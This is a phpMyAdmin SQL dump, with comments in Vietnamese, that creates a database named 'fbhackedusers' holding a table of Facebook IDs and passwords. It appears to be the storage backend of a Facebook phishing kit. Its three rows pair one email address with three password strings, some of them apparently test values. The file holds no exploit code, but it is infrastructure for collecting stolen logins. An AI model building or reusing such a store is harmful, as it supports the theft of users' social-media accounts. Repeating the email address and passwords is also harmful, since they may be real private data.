-- phpMyAdmin SQL Dump
-- version 4.8.5
-- https://www.phpmyadmin.net/
--
-- Máy chủ: 127.0.0.1
-- Thời gian đã tạo: Th2 15, 2023 lúc 02:50 PM
-- Phiên bản máy phục vụ: 10.1.38-MariaDB
-- Phiên bản PHP: 7.3.2

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Cơ sở dữ liệu: `fbhackedusers`
--

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `fbusers`
--

CREATE TABLE `fbusers` (
  `S.No` int(6) NOT NULL,
  `facebookid` varchar(40) NOT NULL,
  `facebookpassword` varchar(40) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Đang đổ dữ liệu cho bảng `fbusers`
--

INSERT INTO `fbusers` (`S.No`, `facebookid`, `facebookpassword`) VALUES
(1, 'shungching14@gmail.com', 'jasygas78dg'),
(2, 'shungching14@gmail.com', 'sadsadasdasda'),
(3, 'shungching14@gmail.com', 'sadsad');

--
-- Chỉ mục cho các bảng đã đổ
--

--
-- Chỉ mục cho bảng `fbusers`
--
ALTER TABLE `fbusers`
  ADD PRIMARY KEY (`S.No`);

--
-- AUTO_INCREMENT cho các bảng đã đổ
--

--
-- AUTO_INCREMENT cho bảng `fbusers`
--
ALTER TABLE `fbusers`
  MODIFY `S.No` int(6) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
